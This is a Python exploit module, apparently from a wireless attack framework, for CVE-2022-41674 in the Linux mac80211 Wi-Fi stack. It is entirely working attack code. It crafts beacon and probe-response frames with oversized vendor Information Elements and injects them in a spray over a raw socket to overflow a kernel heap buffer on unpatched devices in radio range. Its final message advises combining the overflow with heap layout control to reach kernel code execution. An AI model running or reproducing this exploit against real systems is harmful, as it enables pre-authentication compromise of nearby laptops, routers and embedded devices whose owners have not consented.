# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux mac80211 BSS Info Out-of-Bounds Write (CVE-2022-41674).

    The mac80211 subsystem in Linux kernels before 5.19.16 does not properly
    validate the length of Information Elements (IEs) when updating BSS info
    structures during passive or active scanning.

    An attacker within radio range can send crafted 802.11 probe response or
    beacon frames with oversized IEs that overflow the kernel's BSS info
    buffer, corrupting adjacent heap structures. This is reachable before
    any 802.11 authentication or association.

    Patched in kernel 5.19.16, 6.0.2.

    CVSS v3.1: ~8.1 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux mac80211 BSS Info Out-of-Bounds Write (CVE-2022-41674)",
        "description": (
            "Exploits CVE-2022-41674 via an out-of-bounds write in the mac80211 "
            "BSS info update path. Crafted 802.11 beacon or probe response frames "
            "with oversized Information Elements overflow the BSS info buffer, "
            "corrupting adjacent kernel heap structures. Pre-authentication attack "
            "reachable from adjacent radio range during scanning."
        ),
        "authors": (
            "Soenke Huster (TU Darmstadt, discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2022-41674",
            "https://www.openwall.com/lists/oss-security/2022/10/13/5",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aebe9f4639b13a1f4e9a6b42cdd2e38c617b442d",
            "https://openwrt.org/advisory/2022-10-17-1",
        ),
        "devices": (
            "Any Linux device with mac80211 (kernel < 5.19.16)",
            "OpenWrt routers (patched in advisory 2022-10-17-1)",
            "Laptops, embedded systems, IoT devices running Linux WiFi",
        ),
    }

    interface = OptString("wlan0mon", "Wireless interface in monitor mode")
    target_bssid = OptString("", "Target BSSID to impersonate (XX:XX:XX:XX:XX:XX)")
    channel = OptInteger(6, "Wi-Fi channel to operate on")
    timeout = OptFloat(3.0, "Socket timeout in seconds")
    overflow_size = OptInteger(2048, "Oversized IE payload length to trigger OOB write")
    spray_count = OptInteger(24, "Number of trigger frames to send")

    # 802.11 constants
    _FC_BEACON = 0x0080
    _FC_PROBE_RESPONSE = 0x0050
    _IE_SSID = 0
    _IE_SUPPORTED_RATES = 1
    _IE_DS_PARAMETER = 3
    _IE_VENDOR_SPECIFIC = 221

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\xca\xfe\xba\xbe"
    _FAKE_SSID = b"BSS_OOB_TRIG"

    def _mac_to_bytes(self, mac: str) -> bytes:
        return bytes(int(b, 16) for b in mac.split(":"))

    def _build_ie(self, ie_id: int, data: bytes) -> bytes:
        return struct.pack("BB", ie_id, len(data) & 0xFF) + data

    def _build_oversized_ies(self) -> bytes:
        """Build a set of Information Elements with an oversized vendor IE.

        The BSS info update path copies IEs into a fixed-size buffer without
        fully validating the total length. By chaining multiple IEs where the
        aggregate exceeds the buffer, we overflow into adjacent heap objects.
        """
        ies = b""

        # Normal IEs to fill the buffer up to the boundary
        ies += self._build_ie(self._IE_SSID, self._FAKE_SSID)
        ies += self._build_ie(
            self._IE_SUPPORTED_RATES,
            bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24]),
        )
        ies += self._build_ie(self._IE_DS_PARAMETER, struct.pack("B", self.channel))

        # Overflow payload: multiple vendor-specific IEs (max 255 bytes each)
        # that in aggregate exceed the BSS info buffer size
        oui = b"\x00\x50\xf2"  # Microsoft OUI (common, less likely to be filtered)
        remaining = self.overflow_size
        ie_index = 0
        while remaining > 0:
            chunk_size = min(remaining, 249)  # 255 - 3 (OUI) - 1 (type) - 2 (padding)
            fill_byte = (0xA0 + ie_index) & 0xFF
            vendor_data = oui + struct.pack("B", ie_index & 0xFF) + bytes([fill_byte]) * chunk_size
            ies += self._build_ie(self._IE_VENDOR_SPECIFIC, vendor_data)
            remaining -= chunk_size
            ie_index += 1

        return ies

    def _build_probe_response(self) -> bytes:
        """Build a 802.11 probe response with oversized IEs."""
        dest = self._BROADCAST
        src = self._FAKE_BSSID
        bssid = self._mac_to_bytes(self.target_bssid) if self.target_bssid else self._FAKE_BSSID

        fc = struct.pack("<H", self._FC_PROBE_RESPONSE)
        duration = struct.pack("<H", 0)
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dest + src + bssid + seq_ctrl

        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0431)
        fixed = timestamp + beacon_interval + capability

        ies = self._build_oversized_ies()

        return header + fixed + ies

    def _build_beacon_frame(self) -> bytes:
        """Build a 802.11 beacon with oversized IEs."""
        dest = self._BROADCAST
        src = self._FAKE_BSSID
        bssid = self._mac_to_bytes(self.target_bssid) if self.target_bssid else self._FAKE_BSSID

        fc = struct.pack("<H", self._FC_BEACON)
        duration = struct.pack("<H", 0)
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dest + src + bssid + seq_ctrl

        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0431)
        fixed = timestamp + beacon_interval + capability

        ies = self._build_oversized_ies()

        return header + fixed + ies

    def _inject_frame(self, frame: bytes) -> bool:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((self.interface, 0))
            sock.send(frame)
            sock.close()
            return True
        except OSError as e:
            print_error(f"Frame injection failed: {e}")
            return False

    def _detect_target(self) -> bool:
        """Listen for 802.11 traffic to confirm a target is within range."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout * 2)
            sock.bind((self.interface, 0))

            deadline = time.time() + self.timeout * 2
            while time.time() < deadline:
                try:
                    data = sock.recv(4096)
                except TimeoutError:
                    break
                if len(data) < 24:
                    continue
                fc = struct.unpack("<H", data[0:2])[0]
                subtype = (fc & 0x00FC) >> 2
                if subtype in (8, 5, 4):  # Beacon, Probe Response, Probe Request
                    if self.target_bssid:
                        frame_bssid = data[16:22]
                        if frame_bssid == self._mac_to_bytes(self.target_bssid):
                            sock.close()
                            return True
                    else:
                        sock.close()
                        return True
            sock.close()
        except OSError:
            pass
        return False

    def run(self) -> None:
        if not self.check():
            print_error(
                "No active WiFi target detected. Ensure the interface is in "
                "monitor mode and a target is within radio range."
            )
            return

        print_success(
            f"WiFi target detected; sending {self.spray_count} oversized IE "
            f"frames to trigger BSS info OOB write"
        )
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect WiFi targets by listening for management frames."""
        return self._detect_target()

    def _exploit(self) -> None:
        print_status(
            f"Injecting {self.spray_count} frames with {self.overflow_size}-byte "
            f"oversized IEs on {self.interface} (channel {self.channel})"
        )

        for i in range(self.spray_count):
            if i % 3 == 0:
                frame = self._build_beacon_frame()
                ftype = "beacon"
            else:
                frame = self._build_probe_response()
                ftype = "probe_response"

            if not self._inject_frame(frame):
                print_error(f"Failed to inject frame {i + 1}/{self.spray_count}")
                return

            print_info(
                f"  [{ftype}] Frame {i + 1}/{self.spray_count} "
                f"sent ({len(frame)} bytes)"
            )
            time.sleep(0.015)

        print_success(
            "BSS info OOB write sequence delivered. If the target runs a "
            "vulnerable mac80211 stack (kernel < 5.19.16), the oversized IE "
            "payload has overflowed the BSS info buffer. Combine with heap "
            "layout control for reliable kernel code execution."
        )
